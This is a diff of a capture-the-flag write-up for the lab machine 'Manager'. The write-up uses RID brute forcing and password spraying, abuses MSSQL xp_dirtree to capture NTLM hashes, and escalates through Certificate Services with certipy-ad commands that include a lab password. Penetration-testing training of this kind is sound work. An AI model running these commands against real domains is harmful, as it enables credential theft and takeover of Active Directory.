@@ -116,11 +116,7 @@ OS and Service detection performed. Please report any incorrect results at https
 - No LDAP unauthenticated bind
 - Nothing interesting in the web application (no interesting directories or subdomains)
 
-SMB **guest user** access can be performed:
-- No much interesting shares (Default shares)
-- Performed RID brute forcing 
-
-Gained usernames:
+SMB **guest user** access worked, though the shares themselves were just the defaults. We moved on to RID brute forcing, which gave us a solid list of usernames:
 
 ```sh
 sed -n 's/.*MANAGER\\\([^ ]*\) (SidTypeUser).*/\1/p' rids.txt
@@ -140,10 +136,7 @@ Operator
 DC01$
 ```
 
-- Tried finding users who disable Kerberos pre-authentication but no one did
-- Username as password didn't work
-
-Let's turn the first letter of every word to lowercase:
+We tried finding users with Kerberos pre-authentication disabled — no one had it, and username-as-password didn't work either. So we turned the first letter of every username to lowercase:
 
 ```sh
 sed 's/^\(.\)/\L\1/' usernames.txt
@@ -161,11 +154,11 @@ sed 's/^\(.\)/\L\1/' usernames.txt
 
 Created a wordlist with lowercase `lusers.txt`
 
-For forking we can use `--no-brute` in nxc
+For forking the spray we can use `--no-brute` in nxc
 
 > `Operator - operator`
 
-Operator didn't look like a system user — that's when we noticed the **MSSQL server** running on 1433
+Operator didn't look like a real person, and that's what pointed us at the **MSSQL server** listening on 1433
 
 # User
 #### MSSQL
@@ -174,7 +167,8 @@ Operator didn't look like a system user — that's when we noticed the **MSSQL s
 impacket-mssqlclient manager.htb/Operator:'operator'@10.129.11.75
 ```
 
-Operator isn't registered as a MSSQL user, so use `-windows-auth`:
+Operator isn't registered as a MSSQL user, so we need `-windows-auth`:
+
 - **-windows-auth** -> uses your Windows domain credentials instead of a SQL Server password.
 
 ```sh
@@ -183,7 +177,7 @@ impacket-mssqlclient manager.htb/Operator:'operator'@10.129.11.75 -windows-auth
 
 We have restrictions on using `xp_cmdshell`.
 
-`xp_dirtree` -> we used it to connect to our machine and got the NTLM hash in responder, but the host is "**DC01**" which is useless because the hash for DC01 is generated with a **random string**.
+We first tried `xp_dirtree` to connect to our machine and captured the NTLM hash in Responder, but the host was "**DC01**", which is useless — the hash for a machine account is generated with a **random string**.
 
 But we can use **xp_dirtree** to explore the website to find any hidden pages.
 
@@ -205,7 +199,8 @@ exec xpdirtree 'C:\inetpub\wwwroot\', 1, 1;
 
 > **Note**: Without defining proper depth it will display everything, which is more confusing
 
-Guess we got the web application directory and there are two files:
+Guess we got the web application directory, and there are two files:
+
 - `web.config` -> responded with 404 error when visited
 - `website-backup-27-07-23-old.zip` -> when visited, it downloaded the zip file
 
@@ -266,13 +261,14 @@ There's a **hidden** `old-conf.xml` file which revealed the password of the syst
 
 # Root
 
-- Nothing interesting came back from bloodhound
+Nothing interesting came back from bloodhound.
 
 ```powershell
 ps > whomai /all
 ```
 
 **Raven** is a member of the local **Certificate service** group:
+
 - `BUILTIN\Certificate Service DCOM Access`
 
 Quick check for any vulnerable certificate:
@@ -322,7 +318,7 @@ certipy-ad req -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -d
 ```
 
 - Requests a SubCA certificate on behalf of the administrator account using the enabled template.
-- A **private key** will be generated with the number of `Request ID`
+- A **private key** is generated along with a `Request ID`
 
 ```sh
 certipy-ad ca -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.11.75 -ca 'manager-DC01-CA' -issue-request 25
@@ -332,7 +328,7 @@ certipy-ad ca -username Raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -dc
 
 - If the result is an error `[-] Access denied: Insufficient permissions to issue certificate`:
 
-We have to repeat the steps from assigning the officer (from the start)
+We have to start the whole chain over from the officer assignment step
 
 > **Important** : There's a script which rewrites permissions to default, so we have to be faster.... God Speed
 
